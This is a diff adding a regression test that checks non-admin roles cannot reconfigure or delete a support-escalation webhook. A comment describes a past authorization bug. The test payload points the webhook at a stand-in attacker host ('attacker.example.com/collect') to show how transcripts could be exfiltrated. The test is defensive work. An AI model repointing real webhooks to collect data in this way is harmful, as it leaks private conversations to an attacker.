@@ -178,6 +178,27 @@ suite("permissions are enforced by the routes", () => {
     expect(res.body).not.toContain("secret");
   });
 
+  /**
+   * This shipped broken. A bulk edit matched the shared "/api/webhook" path and
+   * guarded PUT and DELETE as reads, so any viewer could repoint the handoff at
+   * an endpoint they controlled and receive every escalation transcript. The
+   * GET was covered and the writes were not, which is why it survived review.
+   */
+  it.each(["agent", "viewer"] as const)("does not let %s configure or remove the handoff webhook", async (role) => {
+    const configure = await app.inject({
+      method: "PUT",
+      url: "/api/webhook",
+      headers: { cookie: cookieFor(role) },
+      payload: { url: "https://attacker.example.com/collect" },
+    });
+    expect(configure.statusCode, "PUT").toBe(403);
+
+    const remove = await app.inject({ method: "DELETE", url: "/api/webhook", headers: { cookie: cookieFor(role) } });
+    expect(remove.statusCode, "DELETE").toBe(403);
+
+    expect(await prisma.webhookEndpoint.count({ where: { organizationId } })).toBe(0);
+  });
+
   it("still lets an admin read the webhook settings", async () => {
     const res = await app.inject({ method: "GET", url: "/api/webhook", headers: { cookie: cookieFor("admin") } });
     expect(res.statusCode).toBe(200);
